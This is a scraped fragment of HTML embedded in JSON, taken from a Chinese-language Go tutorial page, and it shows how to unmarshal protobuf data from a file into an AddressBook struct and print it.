2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"marshal-and-unmarshal-data\">Marshal and Unmarshal Data<a href=\"#marshal-and-unmarshal-data\" class=\"hash-link\" aria-label=\"Marshal and Unmarshal Data的直接連結\" title=\"Marshal and Unmarshal Data的直接連結\">​</a></h3><p>使用 proto 套件提供的 <code>Marshal</code> 和 <code>Unmarshal</code> 的資料可以對資料進行序列化和反序列化的動作：</p><div class=\"language-go codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-go codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// proto.Unmarshal(b []byte, m Message) error</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">import</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;fmt&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;google.golang.org/protobuf/proto&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;io/ioutil&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> pb </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;sandbox/protobuf-sandbox/proto&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">func</span><span class=\"token plain\"> </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">main</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 讀檔</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> in</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token boolean\" style=\"color:rgb(255, 88, 116)\">_</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> ioutil</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">ReadFile</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;addressbook.data&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 建立 struct</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> addressBook </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> pb</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">AddressBook</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 透過 proto.Unmarshal 把讀出的內容與 struct 做 mapping</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">if</span><span class=\"token plain\"> err </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> proto</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">Unmarshal</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">in</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&amp;</span><span class=\"token plain\">addressBook</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"> err </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">!=</span><span class=\"token plain\"> </span><span class=\"token boolean\" style=\"color:rgb(255, 88, 116)\">nil</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  fmt</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">Println</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;can not parse the file&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> fmt</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">Println</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">&amp;</span><span class=\"token plain\">addressBook</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// people:{name:&quot;Aaron&quot; id:1 email:&quot;aaronchen@jubo.health&quot; phones:{number:&quot;12345678&quot;}}</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  }
}